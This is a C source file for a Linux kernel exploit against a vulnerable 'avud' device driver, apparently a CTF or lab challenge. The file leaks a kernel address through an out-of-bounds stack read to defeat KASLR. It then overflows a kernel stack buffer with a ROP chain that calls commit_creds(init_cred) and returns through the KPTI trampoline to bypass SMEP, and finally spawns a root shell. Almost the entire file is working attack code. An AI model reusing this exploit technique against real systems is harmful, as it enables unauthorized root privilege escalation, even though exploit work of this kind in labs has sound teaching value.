
#include "../utils.h"

ull kernel_base = 0;
ull user_cs, user_ss, user_sp, user_rflags, user_fs;

/*

typedef struct {	
    void * input;
    void * output;
    
    size_t input_len;
    size_t output_len;
    
    int input_offset;
    int output_offset;

    char * tag;
    size_t input_index;
} avud_request;

*/

void save_state(){
		__asm__(
			".intel_syntax noprefix;"
			"mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
			".att_syntax;"
		);
		/*puts("[*] Saved state:");
		printf("	[+] cs: %lx\n",user_cs);
		printf("	[+] ss: %lx\n",user_ss);
		printf("	[+] sp: %lx\n",user_sp);
		printf("	[+] eflags: %lx\n",user_rflags);*/
}

ull drop_shell() { 

	if(getuid() != 0){
		printf("[!] UID == %d -> No root shell bozo\n",getuid());
		return -1;
	}
	printf("[!] Executing shell as UID %d\n",getuid());
	system("/bin/sh");

	exit(0);

	return 0x13376969;
}

int main(){

	// Later used in our rop chain
	save_state();
	
	int out;

	// Open device (stored in global fd)
	open_avud();

	avud_request * req = alloc_request();

	#ifdef NOKASLR
	
	printf("[*] NoKASLR enabled\n");
	kernel_base = 0xffffffff81000000;

	#else 

	printf("[*] KASLR enabled\n");
	avud_request * req_oobr = alloc_request();

	int out_size = 256 + 128 + 64;

	req_oobr->output = alloc(out_size);
	req_oobr->output_len = out_size;

	// Read from kernel stack
	printf("[*] Leaking kernel address\n");
	stack_OOBR_request(req_oobr);

	ull * leak = (ull *) req_oobr->output;

	// Find with debug run
	/*
	for(int i = 0; i < out_size/8; i++){
		printf("[%d] - 0x%lx\n",i,leak[i]);
	}
	*/

	int ioctl_offset = 639;
	ull leaked_ret = leak[47]; // points into return from ioctl

	// 0x19f7b0 = x64_sys_ioctl - base
	kernel_base = leaked_ret - 0x19f7b0 - ioctl_offset;

	#endif

	printf("[+] Kernel base: %p\n",kernel_base);

	/*
	out = BOF_request(req);
	assert(out == -1);

	printf("[*] Invalid request %lx - %s\n",errno,strerror(errno));
	*/

	printf("[*] Allocating AVUD request and ROP chain\n");
	req->input = (void *)alloc(512);
	memset(req->input,'A',256); // Offset

	int rp = 32; // 256 / 8
	ull * chain = (ull *) req->input;
	chain[rp++] = 0x4242424242424242; // pop rbx
	chain[rp++] = 0x4343434343434343; // pop rbp
	chain[rp++] = 0x4444444444444444; // pop r12
	chain[rp++] = 0x4545454545454545; // pop r13

	// 0xffffffff81a390e0: init_cred (Essentially root creds)
	// 0xffffffff81a390e0 - 0xffffffff81000000 = 0xa390e0
	ull init_cred_ptr = kernel_base + 0xa390e0;

	// Now we gotta pop rdi with our init_cred address

	// 0xffffffff81217f2d: pop rdi; ret; 
	// 0xffffffff81217f2d - 0xffffffff81000000 = 0x217f2d
	ull pop_rdi = kernel_base + 0x217f2d;
	chain[rp++] = pop_rdi; // ret
	chain[rp++] = init_cred_ptr; 

	// 0xffffffff81090620 - 0xffffffff81000000 = 0x090620
	ull commit_creds = kernel_base + 0x090620;
	chain[rp++] = commit_creds;

	/*
	
	Now we gotta bypass SMEP and KPTI 
	This can be done by using swapgs_restore_regs_and_return_to_usermode
	ffffffff81600ef0 T swapgs_restore_regs_and_return_to_usermode

	We can start at +49 so we skip all pops
    0xffffffff81600f20 <common_interrupt_return+48>:     pop    rsi
    0xffffffff81600f21 <common_interrupt_return+49>:     mov    rdi,rsp
    0xffffffff81600f24 <common_interrupt_return+52>:     mov    rsp,QWORD PTR gs:0x6004
	
	*/

	ull kpti_trampoline = kernel_base + 0x600ef0 + 49;

	chain[rp++] = kpti_trampoline;
	chain[rp++] = 0; // rax
	chain[rp++] = 0; // rdi

	chain[rp++] = &drop_shell; // rip
	
	chain[rp++] = user_cs;
	chain[rp++] = user_rflags;

	chain[rp++] = user_sp + 8; // +8 because the target function would be unaligned otherwise
	chain[rp++] = user_ss;

	printf("[*] Printing ROP chain:\n");
	print_array(chain + 28, rp - 28);

	req->input_len = 512;

	printf("[*] Sending AVUD request...\n");
	out = stack_BOF_request(req);

	
}
